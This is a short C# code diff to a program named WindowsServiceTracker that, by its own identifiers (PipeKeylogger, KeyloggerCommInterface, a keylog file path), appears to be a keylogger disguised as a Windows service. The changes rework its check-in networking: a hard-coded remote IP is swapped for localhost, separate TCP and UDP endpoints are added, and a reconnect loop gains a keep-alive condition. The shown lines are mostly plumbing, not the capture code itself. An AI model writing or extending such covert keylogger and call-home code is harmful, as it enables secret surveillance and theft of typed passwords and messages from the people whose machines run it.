@@ -41,9 +41,10 @@ namespace WindowsServiceTracker
         public const int checkInWaitTime = 60000;
 
         //Variables
-        private volatile String ipAddressString = "172.17.57.149";
+        private volatile String ipAddressString = "127.0.0.1";
         private IPAddress ipAddress = new IPAddress(0x0100007F);// = 0x0100007F; //default to local host
-        private IPEndPoint ipPort;
+        private volatile IPEndPoint tcpIpPort;
+        private volatile IPEndPoint udpIpPort;
         private ChannelFactory<KeyloggerCommInterface> pipeFactory = new ChannelFactory<KeyloggerCommInterface>(
             new NetNamedPipeBinding(), new EndpointAddress("net.pipe://localhost/PipeKeylogger"));
         private KeyloggerCommInterface pipeProxy;
@@ -98,7 +99,8 @@ namespace WindowsServiceTracker
             }
             catch (Exception)
             { }
-            ipPort = new IPEndPoint(ipAddress, PORT);
+            tcpIpPort = new IPEndPoint(ipAddress, PORT);
+            udpIpPort = new IPEndPoint(ipAddress, PORT);
 
             CreateOpenPipe();
             keyLogFilePath = GetKeylogFilePath();
@@ -236,7 +238,7 @@ namespace WindowsServiceTracker
             int time = 0;
             int delay = 5000;
 
-            while (!connectUdp())
+            while (connectionKeepAlive && !connectUdp())
             {
                 Thread.Sleep(delay);
             }
@@ -273,9 +275,9 @@ namespace WindowsServiceTracker
         {
             try
             {
-                udp = new UdpClient(ipPort);
+                udp = new UdpClient(tcpIpPort);
                 UdpState state = new UdpState();
-                state.endpoint = ipPort;
+                state.endpoint = tcpIpPort;
                 state.client = udp;
                 udp.BeginReceive(ReceiveCallback, state);
                 return true;
@@ -410,7 +412,7 @@ namespace WindowsServiceTracker
             try
             {
                 tcp = new TcpClient();
-                tcp.Connect(ipPort);
+                tcp.Connect(tcpIpPort);
                 return true;
             }
             catch (Exception)
